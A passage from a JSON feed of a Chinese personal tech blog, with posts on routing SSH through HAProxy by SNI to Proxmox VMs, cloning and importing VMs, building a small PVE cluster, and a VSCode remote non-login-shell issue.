haproxy</span><br></pre></td></tr></table></figure></p>\n<p>或者源码编译安装</p>\n<p>可快速上手学习、搜索问题的<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFwcm94eS5jb20vYmxvZw==\">官网资料</span></p>\n<h1 id=\"配置haproxycfg\"><a class=\"anchor\" href=\"#配置haproxycfg\">#</a> 配置 <code>haproxy.cfg</code></h1>\n<p>编辑  <code>/etc/haproxy/haproxy.cfg</code>  配置文件，所需要的基本指令如下：</p>\n<p>检查并重载配置文件</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">haproxy -f /etc/haproxy/haproxy.cfg</span><br></pre></td></tr></table></figure></p>\n<p>仅检查：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">haproxy -f /etc/haproxy/haproxy.cfg -c</span><br></pre></td></tr></table></figure></p>\n<p>⚠️ 注意，文件最后需要有换行符结尾，否则会有报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Missing LF on last line, file might have been truncated at position xx</span><br></pre></td></tr></table></figure></p>\n<p>重启  <code>haproxy</code>  服务</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service haproxy restart</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">or</span></span><br><span class=\"line\">systemctl restart haproxy</span><br></pre></td></tr></table></figure></p>\n<p>配置由 5 部分组成，当然并不都是必须的： <code>global</code> 、  <code>defaults</code> 、  <code>frontend</code>  、 <code>backend</code> 、  <code>listen</code>  （可能还有更多）</p>\n<p>我们的 SSH 代理转发需求只需配置  <code>frontend</code>  、 <code>backend</code>  即可，我们的配置如下：</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>raw</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frontend fe_ssh</span><br><span class=\"line\">   bind *:2222 ssl crt /etc/pve/nodes/proxmox2/pveproxy-ssl.pem</span><br><span class=\"line\">   mode tcp</span><br><span class=\"line\">   log-format &quot;%ci:%cp [%t] %ft %b/%s %Tw/%Tc/%Tt %B %ts %ac/%fc/%bc/%sc/%rc %sq/%bq dst:%[var(sess.dst)] &quot;</span><br><span class=\"line\">   tcp-request content set-var(sess.dst) ssl_fc_sni</span><br><span class=\"line\">   use_backend %[ssl_fc_sni]</span><br><span class=\"line\"></span><br><span class=\"line\">backend server1</span><br><span class=\"line\">   mode tcp</span><br><span class=\"line\">   server s1 192.168.134.247:22 check</span><br><span class=\"line\"></span><br><span class=\"line\">backend server2</span><br><span class=\"line\">   mode tcp</span><br><span class=\"line\">   server s2 192.168.134.30:22 check</span><br><span class=\"line\"></span><br><span class=\"line\">backend server3</span><br><span class=\"line\">   mode tcp</span><br><span class=\"line\">   server s2 172.18.198.204:22 check</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>其中  <code>frontend</code>  后面的  <code>fe_ssh</code>  、 <code>backend</code>  后面的  <code>server1</code>  等都是自定义的名字；</li>\n<li>端口 <code>bind *:2222</code>  所指定的端口也是自定义的；跟在其后面的 <code> ssl crt /etc/pve/nodes/proxmox2/pveproxy-ssl.pem</code>  是指定  <code>ssl</code>  证书，该路径是 PVE 的通过上传的或用其提供插件自动申请的 ssl 证书所在路径。\n<ul>\n<li>haproxy 似乎只认定一个  <code>xxx.pem</code>  证书文件的对应 key 文件是  <code>xxx.pem.key</code>  ，所以 key 文件需要以这个形式命名放在 pem 相同路径上</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"ssh-连接\"><a class=\"anchor\" href=\"#ssh-连接\">#</a> SSH 连接</h1>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -o ProxyCommand=&quot;openssl s_client -quiet -connect [服务器ip]:2222 -servername [servername]&quot; -l [登陆虚拟机用的用户名] [虚拟机主机名]</span><br></pre></td></tr></table></figure></p>\n<p>其中：</p>\n<ul>\n<li>\n<p>[服务器 ip] 即一般使用 ssh 登陆时的 @ 后面的 ip，或者主机名</p>\n</li>\n<li>\n<p>[登陆虚拟机用的用户名] 即一般使用 ssh 登陆时的 @ 前面的用户名</p>\n</li>\n<li>\n<p>[servername] 是  <code>backend</code>  指定的对应服务器名字，例如我们配置文件中的 server1 、 server2 、 server3</p>\n</li>\n<li>\n<p>[虚拟机主机名] 可以自定义，但是推荐最好和虚拟机主机名一致</p>\n</li>\n</ul>\n<p>使用 PVE 的虚拟机连接您可能经常遇到这样的经典报错：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class=\"line\">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class=\"line\">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class=\"line\">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class=\"line\">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class=\"line\">It is also possible that a host key has just been changed.</span><br><span class=\"line\">The fingerprint for the ED25519 key sent by the remote host is</span><br><span class=\"line\">SHA256: 114514.</span><br><span class=\"line\">Please contact your system administrator.</span><br><span class=\"line\">Add correct host key in ....../.ssh/known_hosts to get rid of this message.</span><br><span class=\"line\">Offending ED25519 key in ....../.ssh/known_hosts:xxx</span><br><span class=\"line\">Host key for xxx has changed and you have requested strict checking.</span><br><span class=\"line\">Host key verification failed.</span><br></pre></td></tr></table></figure></p>\n<p>当然可以  <code>ssh-keygen -R &lt;host&gt;</code>  清理就行了。</p>\n<p>为什么这个报错经典呢？因为如果您也用了 cloud-init 并经常 regenerate，或者经常给虚拟机换 ip 或给 ip 换虚拟机，就会这样。<s>习惯就好</s></p>\n<h1 id=\"dashboard\"><a class=\"anchor\" href=\"#dashboard\">#</a> Dashboard</h1>\n<p><figure class=\"highlight plaintext\"><figcaption><span>raw</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frontend stats</span><br><span class=\"line\">    mode http</span><br><span class=\"line\">    bind *:9000</span><br><span class=\"line\">    stats enable</span><br><span class=\"line\">    stats uri /stats</span><br><span class=\"line\">    stats refresh 10s</span><br><span class=\"line\">    # stats uri /stats # choose a subpath for the dashboard</span><br><span class=\"line\">    # stats admin if localhost   # enable to restrict to localhost</span><br><span class=\"line\">    # stats admin if 10.0.0.0/8  # enable to restrict to 10.x.x.x network sources</span><br><span class=\"line\">    # stats admin auth &lt;username:password&gt; # enable to setup basic http auth</span><br></pre></td></tr></table></figure></p>\n<p>目前发现每次修改配置文件后 dashboard 没有同步更新，除非修改 dashboard 配置的端口号，在新端口号才有同步更新了的数据</p>\n<p>配置好后可以打开  <code>http://node_ip:9000/stats</code></p>\n<p>若想要 https 访问，则需要在  <code>bind *:9000</code>  后面加上 ssl 证书文件路径，否则只能 http 访问</p>\n<p><figure class=\"highlight plaintext\"><figcaption><span>raw</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bind *:9000 ssl crt /etc/pve/nodes/proxmox2/pveproxy-ssl.pem</span><br></pre></td></tr></table></figure></p>\n<p>最终效果（图中用的是 9002 端口）：</p>\n<p><img data-src=\"/assets/cs/pve/haproxy-ssh/dashboard.png\" alt=\"dashboard\" /></p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lmthc3BlcnNreS5jb20vS1dUUy82LjEvemgtSGFucy8xNjc3NDAuaHRt\">reference1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFwcm94eS5jb20vYmxvZy9yb3V0ZS1zc2gtY29ubmVjdGlvbnMtd2l0aC1oYXByb3h5\">reference2</span></li>\n</ul>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/clone-vm/",
            "url": "https://taf.fyi/cs/pve/clone-vm/",
            "title": "VM迁移与克隆",
            "date_published": "2024-03-10T16:00:00.000Z",
            "content_html": "<h1 id=\"vmware-或-virtualbox-导出虚拟机\"><a class=\"anchor\" href=\"#vmware-或-virtualbox-导出虚拟机\">#</a> VMware 或 VirtualBox 导出虚拟机</h1>\n<p>导出之前可以参考以下几个因素，避免后续麻烦：</p>\n<ul>\n<li>虚拟机由 VMware 或 VirtualBox 导出，磁盘镜像有可能是 vmdk 格式，如果从 KVM 管理器导出，可能是 qcow2 格式。最流行的虚拟机导出格式是 OVF 标准，但实际上由于 OVF 标准本身不完善，以及虚拟机管理器导出的众多非标准扩展信息，跨管理器使用 OVF 往往受很多限制。</li>\n<li>除了格式不兼容之外，如果虚拟机管理器之间的虚拟硬件设备差别太大，也可能导致虚拟机镜像导入失败。特别是 Windows 虚拟机，对于硬件变化特别敏感。为解决这一问题，可以在导出 Windows 虚拟机之前安装 MergeIDE.zip，并在导入后启动前将虚拟磁盘改为 IDE 类型。</li>\n<li>最后还需要考虑半虚拟化驱动因素。半虚拟化驱动能够改善虚拟硬件性能，但往往针对特定虚拟机管理器。GNU/Linux 和其他开源 Unix 类操作系统默认已经安装所有必要的半虚拟化驱动，可以在导入虚拟机后直接改用半虚拟化驱动。对于 Windows 虚拟机，还需要自行安装 Windows 版本的半虚拟化驱动软件。</li>\n</ul>\n<p>GNU/Linux 和其他开源 Unix 虚拟机通常可以直接导入。但由于以上提到的因素，不能保证所有 Windows 虚拟机均能够顺利导入成功。</p>\n<p>以 VMware 导出举例，点击： <code>文件 / File -&gt; 导出为OVF / Export as OVF </code></p>\n<p><img data-src=\"/assets/cs/pve/clone-vm/vmware.png\" alt=\"vmware\" /></p>\n<h1 id=\"导入虚拟机到-pve\"><a class=\"anchor\" href=\"#导入虚拟机到-pve\">#</a> 导入虚拟机到 PVE</h1>\n<p>执行以下命令可以创建新虚拟机，虚拟机的 CPU、内存和名称沿用 OVF 配置文件中的设置，磁盘镜像将导入存储。网络配置可以手工完成。</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qm importovf 999 myvm.ovf local-lvm</span><br></pre></td></tr></table></figure></p>\n<p>其中  <code>999</code>  是虚拟机 id ， <code>local-lvm</code>  表示磁盘镜像将导入该节点的 local-lvm 存储</p>\n<h1 id=\"克隆-pve-虚拟机\"><a class=\"anchor\" href=\"#克隆-pve-虚拟机\">#</a> 克隆 PVE 虚拟机</h1>\n<h2 id=\"full-clone\"><a class=\"anchor\" href=\"#full-clone\">#</a> Full Clone</h2>\n<p>可以从 VM 或者 VM 模版 Full Clone 一个 VM ，这样会完全复制一台虚拟机，占用和原来虚拟机一样的磁盘，克隆需要的时间久一点。</p>\n<h2 id=\"linked-clone\"><a class=\"anchor\" href=\"#linked-clone\">#</a> Linked Clone</h2>\n<p>首先需要将一台已有的 VM 关机后转化为模版：</p>\n<p><img data-src=\"/assets/cs/pve/clone-vm/convert-to-template.png\" alt=\"convert-to-template\" /></p>\n<p>此后该虚拟机无法再被启动，被锁定作为一个共享的模版。希望从该模版创建虚拟机，则右击该 VM 模版选择克隆 / Clone ，此时可以选择 Linked Clone，这样得到的虚拟机会和该模版虚拟机共享磁盘，创建速度更快，而且占用磁盘更少。</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/pve/pve-build/",
            "url": "https://taf.fyi/cs/pve/pve-build/",
            "title": "PVE搭建小集群记录",
            "date_published": "2024-03-08T16:00:00.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在 Matrix 实验室用电子垃圾搭了一个小集群。</p>\n<p>起因是 jygg 拿了一台被淘汰的存储型服务器给 cjl 玩，(据说是以前买来发现性能太差了，于是就把里面的 64T 的硬盘全部拿走了装到别的服务器上了，这台就废弃了)，cjl 整了个 500g 的机械硬盘给服务器装上了，同时把不知为啥留在这里的一个台式 PC 给我玩，然后索性就装上了 PVE，在 jygg 的帮助下非常顺利搭了一个两台物理机组成的集群。</p>\n<h1 id=\"安装-pve\"><a class=\"anchor\" href=\"#安装-pve\">#</a> 安装 PVE</h1>\n<p>到<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucHJveG1veC5jb20=\">官网</span>下载 PVE，这是一个只有 1G 大小左右的基于 debian 的装好了 proxmox 相关软件、服务的镜像，然后用 U 盘给物理机安装。</p>\n<p>安装过程可以用 proxmox 提供的图形化安装页面，当然安装好的 debian 本身不会有 GUI。会需要用到键盘，以及鼠标 (除非键盘技巧特别好)。</p>\n<p>安装过程有一些需要额外注意：</p>\n<ul>\n<li>hostname 会设置采取 FQDN 域名，但是实际上 proxmox 只会检查输入的是不是默认的  <code>.invalid</code>  结尾，只需改掉这个即可\n<ul>\n<li>jygg 说这个域名最好不要填可以被解析到的域名</li>\n</ul>\n</li>\n<li>不需要设置登陆 debian 的用户名，web 控制台登陆用的超级管理员用户名即 root 即可</li>\n<li>安装过程设置的 ip 地址后面改起来也比较麻烦（尤其是组建集群时）最好提前确定好\n<ul>\n<li>jygg 的帮助下我们安装时就给 2 个物理机设置了校园网内可供访问的 ip（Matrix 从校园网络中心租的网段）</li>\n</ul>\n</li>\n<li>DNS Server 在这个界面里只能设置一个，可以安装完后再加</li>\n<li>安装结束，及时拔掉 U 盘，然后重启即可</li>\n<li>此后不再需要显示器键盘鼠标等外设，物理机插着电源和网线即可</li>\n</ul>\n<p>重启后，用浏览器可以直接访问  <code>https://ip:8006</code>  或  <code>https://域名:8006</code>  ，登陆 proxmox 的控制台，需要注意 PVE 强制只能使用 https 协议</p>\n<p>按照先前 jygg 说的安装过程最好不使用可被解析的域名，此时应该没法使用域名访问，用 ip 访问即可</p>\n<p>此外还需记得配置 dns 服务器：</p>\n<p><img data-src=\"/assets/cs/pve/pve/dns.png\" alt=\"dns\" /></p>\n<h1 id=\"ssl-证书\"><a class=\"anchor\" href=\"#ssl-证书\">#</a> ssl 证书</h1>\n<p>这里介绍两种方法，都可以通过 PVE 控制台操作实现。需要注意，两种方法最后节点网页使用的 ssl 证书的路径在该节点  <code>/etc/pve/nodes/节点名/</code>  目录下，名字默认是：</p>\n<ul>\n<li><code>pveproxy-ssl.pem</code></li>\n<li><code>pveproxy-ssl.key</code></li>\n</ul>\n<p><img data-src=\"/assets/cs/pve/pve/%E8%AF%81%E4%B9%A6%E4%BD%8D%E7%BD%AE.png\" alt=\"证书位置\" /></p>\n<h2 id=\"插件自动申请-ssl-证书\"><a class=\"anchor\" href=\"#插件自动申请-ssl-证书\">#</a> 插件自动申请 ssl 证书</h2>\n<p>为了 https 访问能够不被浏览器阻挡，也为了安全，还需给自己的域名申请 ssl 证书，此后就用  <code>https://域名:8006</code>  对此 PVE 提供了基于 <span class=\"exturl\" data-url=\"aHR0cDovL2FjbWUuc2g=\">acme.sh</span> 的自动化脚本，根据不同运营商给 proxmox 安装对应的插件，就可以实现自动申请 ssl 证书</p>\n<p><img data-src=\"/assets/cs/pve/pve/ssl.png\" alt=\"ssl\" /></p>\n<h3 id=\"注册-acm-账号\"><a class=\"anchor\" href=\"#注册-acm-账号\">#</a> 注册 ACM 账号</h3>\n<p>数据中心 -&gt; ACME -&gt; 账户</p>\n<p><img data-src=\"/assets/cs/pve/pve/%E6%B3%A8%E5%86%8CACM%E8%B4%A6%E5%8F%B7.png\" alt=\"注册ACM账号\" /></p>\n<h3 id=\"添加-acme-插件\"><a class=\"anchor\" href=\"#添加-acme-插件\">#</a> 添加 ACME 插件</h3>\n<p>数据中心 -&gt; ACME -&gt; 质询插件，或者指令  <code>pvenode acme plugin add </code></p>\n<p>ACME 插件的配置存放在  <code>/etc/pve/priv/acme/plugins.cfg</code>  中 ，一个插件可供整个集群使用</p>\n<p>我们当然没有公网 ip，只能选择 dns 挑战。按照我们购买域名的运营商选择对应 api 接口，在运营商网页 API 相关部分获取对应的接口所需数据，填入数据，然后创建 acme 插件即可。</p>\n<p><img data-src=\"/assets/cs/pve/pve/acme-plugin.png\" alt=\"acme-plugin\" /></p>\n<p>如图是以 Porkbun 运营商为例创建 acme 插件</p>\n<h3 id=\"添加节点域名\"><a class=\"anchor\" href=\"#添加节点域名\">#</a> 添加节点域名</h3>\n<p>每一个物理机节点都可以设置一个节点域名（node domain），但实际上一个集群只需要一台机器的 ip 绑定对应域名即可。选择这个 “主节点”：</p>\n<p>机器 -&gt; Certificate / 凭证 -&gt; ACME -&gt; Add / 添加</p>\n<p>选择刚刚创建好的 acme 插件，填入你想要绑定的域名即可：</p>\n<p><img data-src=\"/assets/cs/pve/pve/%E8%8A%82%E7%82%B9%E5%9F%9F%E5%90%8D.png\" alt=\"节点域名\" /></p>\n<p>最后点击 Order Certificate Now / 立即预约凭证 ，api 填写无误将顺利完成任务得到 OK 状态，后续不再需要手动申请证书，PVE 将利用 acme 插件定期自动申请凭证。</p>\n<h2 id=\"手动上传-ssl-证书\"><a class=\"anchor\" href=\"#手动上传-ssl-证书\">#</a> 手动上传 ssl 证书</h2>\n<p>另一种方式是使用自己申请的 ssl 证书：</p>\n<p><img data-src=\"/assets/cs/pve/pve/%E8%87%AA%E5%B7%B1%E4%B8%8A%E4%BC%A0ssl%E8%AF%81%E4%B9%A6.png\" alt=\"自己上传ssl证书\" /></p>\n<p>如图上传对应的  <code>pem</code>  和  <code>key</code>  文件即可。当然这种方式需要记得 ssl 过期前重新申请并上传文件。</p>\n<h1 id=\"更换-apt-软件源\"><a class=\"anchor\" href=\"#更换-apt-软件源\">#</a> 更换 apt 软件源</h1>\n<p>PVE 实际上是一个 Debian ，按照 debian 换源方式操作即可。</p>\n<p>需要注意的是 PVE 内置了一个  <code>enterprise</code>  软件源，但是这个软件源必须向 Proxmox 订阅（充钱）才能使用。我们当然只想白嫖，也不是商业用途，所以我们要把  <code>/etc/apt/sources.list.d/pve-enterprise.list</code>  里的这个软件源注释掉（当然删掉这个文件也是可以的）：</p>\n<p><figure class=\"highlight javascript\"><figcaption><span>javascript</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb <span class=\"attr\">https</span>:<span class=\"comment\">//enterprise.proxmox.com/debian/pve buster pve-enterprise</span></span><br></pre></td></tr></table></figure></p>\n<p>或者可以在 web 控制台操作禁用这些包含 enterprise 字眼的软件源</p>\n<p>最后还需创建一个  <code>/etc/apt/sources.list.d/pve-no-subscription.list</code>  文件，（当然其实文件名只是给人看的，名字自定义即可）然后在文件内添加无需订阅的 PVE 软件源：</p>\n<p><figure class=\"highlight javascript\"><figcaption><span>javascript</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"variable constant_\">PVE</span> pve-no-subscription repository provided by proxmox.<span class=\"property\">com</span>,</span><br><span class=\"line\"># <span class=\"variable constant_\">NOT</span> recommended <span class=\"keyword\">for</span> production use</span><br><span class=\"line\">deb <span class=\"attr\">http</span>:<span class=\"comment\">//download.proxmox.com/debian/pve bookworm pve-no-subscription</span></span><br></pre></td></tr></table></figure></p>\n<p>注意其中  <code>bookworm</code>  是我们的 debian12 版本名，如果你的版本不一样还需换成对应的名字</p>\n<p>最后结果：</p>\n<p><img data-src=\"/assets/cs/pve/pve/apt.png\" alt=\"apt\" /></p>\n<h1 id=\"动态配置网络\"><a class=\"anchor\" href=\"#动态配置网络\">#</a> 动态配置网络</h1>\n<p>默认在 PVE 里更改宿主机的网络配置是需要重启才能生效的，此时所有虚拟机业务都会中断。所以我们需要让 PVE 支持 Reload 网络配置，方法很简单：</p>\n<p><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install ifupdown2</span><br></pre></td></tr></table></figure></p>\n<p>如果安装时提示说需要卸载 proxmox-ve，请确保已经加入了  <code>pve-no-subscription</code>  这个软件源并  <code>apt update</code></p>\n<h1 id=\"配置防火墙\"><a class=\"anchor\" href=\"#配置防火墙\">#</a> 配置防火墙</h1>\n<p>PVE 的防火墙层级比较复杂，分为三个部分：</p>\n<ul>\n<li>集群</li>\n<li>主机</li>\n<li>VM</li>\n</ul>\n<p>每个部分都由各自的开关，并且在每个虚拟机网卡上也有开关。</p>\n<p>** 首先要打开集群（Cluster）的防火墙开关。** 然后你可以配置整个集群的防火墙规则，比如限制对主机的 22 端口访问。</p>\n<p>但是你会发现没有起作用。这是因为主机（Host）的防火墙开关没开。所以还需要<strong>开一下主机（Host）的防火墙开关</strong>。</p>\n<p>此时主机的防火墙规则应当已经工作，如果还没有工作，<strong>请检查网卡的防火墙开关是否开启</strong>。</p>\n<blockquote>\n<p>Please however check that you:</p>\n</blockquote>\n<ul>\n<li>\n<blockquote>\n<p>Enabled firewalling on Data Centre options</p>\n</blockquote>\n</li>\n<li>\n<blockquote>\n<p>Enabled firewalling on Node(s)</p>\n</blockquote>\n</li>\n<li>\n<blockquote>\n<p>Enabled firewalling on VM</p>\n</blockquote>\n</li>\n<li>\n<blockquote>\n<p>Set individual VM network interfaces to firewall</p>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5wcm94bW94LmNvbS90aHJlYWRzL3B2ZS1maXJld2FsbC1kb2VzbnQtaGF2ZS1hbnktZWZmZWN0LjQ3MzkzLw==\">https://forum.proxmox.com/threads/pve-firewall-doesnt-have-any-effect.47393/</span></p>\n</blockquote>\n<p>为了搭建 Kubernetes 节点，下一步需要创建对应的 VM 节点。但手动创建 VM 节点、安装系统也是痛苦的，所以应该使用 Terraform 来简化这个过程，并自始至终保持可管理性。</p>\n<h1 id=\"参考资料\"><a class=\"anchor\" href=\"#参考资料\">#</a> 参考资料</h1>\n<p>参考了 Matrix 的知识库。官方文档是全英文的，非常详细，但是英文不太适合快速上手，可以考虑参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wdmUtZG9jLWNuLnJlYWR0aGVkb2NzLmlvL3poLWNuL2xhdGVzdC8=\">中文翻译版本</span>，这个翻译不一定及时更新到最新 proxmox 版本</p>\n<script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kity@2.0.4/dist/kity.min.js\"></script><script type=\"text&#x2F;javascript\" src=\"https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js\"></script><script defer=\"true\" type=\"text&#x2F;javascript\" src=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js\"></script><link rel=\"stylesheet\" type=\"text&#x2F;css\" href=\"https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css\">",
            "tags": [
                "计算机科学",
                "PVE",
                "DevOps"
            ]
        },
        {
            "id": "https://taf.fyi/cs/linux/vscode-ssh-login-shell/",
            "url": "https://taf.fyi/cs/linux/vscode-ssh-login-shell/",
            "title": "VSCode远程SSH连接的shell相关一个bug",
            "date_published": "2024-03-02T16:00:00.000Z",
            "content_html": "<h1 id=\"环境情景\"><a class=\"anchor\" href=\"#环境情景\">#</a> 环境 / 情景</h1>\n<p>MacOS 14.2 M1 用 VSCode 远程连接 Ubuntu 22.04</p>\n<h1 id=\"问题\"><a class=\"anchor\" href=\"#问题\">#</a> 问题</h1>\n<p>在虚拟机上安装了 Enviroment Modules ，并按照<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tb2R1bGVzLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdC9JTlNUQUxMLmh0bWwjY29uZmlndXJhdGlvbg==\">官方配置文档</span>配置了 bash 启动时自动加载  <code>module</code>  指令，ssh 远程登录虚拟机 'module' 指令可用，但是 VSCode 远程连接虚拟机发现  <code>module</code>  指令使用不了。</p>\n<h1 id=\"原因\"><a class=\"anchor\" href=\"#原因\">#</a> 原因</h1>\n<p>在 VSCode 的 bash 中检查发现当前 shell 不是登录式的：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shopt login_shell</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">结果为 off 不是登陆式</span></span><br><span class=\"line\">login_shell    \toff</span><br></pre></td></tr></table></figure></p>\n<p>分析发现由于 VSCode 启动 shell 是非登陆式，参考我<a href=\"https://taf.fyi/cs/devops/shell\">这篇</a>文章，所以没有加载  <code>/etc/profile</code>  文件，而该文件下包含如下内容：</p>\n<p><figure class=\"highlight shell\"><figcaption><span>shell</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if [ -d /etc/profile.d ]; then</span><br><span class=\"line\">  for i in /etc/profile.d/*.sh; do</span><br><span class=\"line\">    if [ -r $i ]; then</span><br><span class=\"line\">      . $i</span><br><span class=\"line\">    fi</span><br><span class=\"line\">  done</span><br><span class=\"line\">  unset i</span><br><span class=\"line\">fi</span><br></pre></td></tr></table></figure></p>\n<p>因此也没有加载  <code>/etc/profile.d/</code>  目录下的文件，自然也没有加载 Enviroment Modules 官方文档配置的   <code>/etc/profile.d/modules.sh</code>  或  <code>/etc/profile.d/modules.csh</code>  这些 Linux Link。导致了 VSCode 的终端无法使用 'module' 指令。</p>\n<p>去官方文档搜索找到了一个 open 的 issue ：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY3Jvc29mdC92c2NvZGUtcmVtb3RlLXJlbGVhc2UvaXNzdWVzLzg0ODQ=\">https://github.com/microsoft/vscode-remote-release/issues/8484</span> ，也是同样的问题，暂时没有解决。</p>\n<h1 id=\"临时解决方案\"><a class=\"anchor\" href=\"#临时解决方案\">#</a> 临时解决方案</h1>\n<p>暂时无法从 VSCode 这一远程连接服务端解决，那就只能：</p>\n<ul>\n<li>要么从控制端解决，每次 VSCode 打开一个 shell 后手动输指令加载  <code>/etc/profile</code>  文件</li>\n<li>要么从受控端解决\n<ul>\n<li>在 Ubuntu 里编辑  <code>/etc/bash.bashrc</code>  或  <code>~/.bashrc</code>  让它加载  <code>/etc/profile</code>   等 login shell 才能加载的文件，虽然保证了 VSCode 的 shell 环境能够与 login 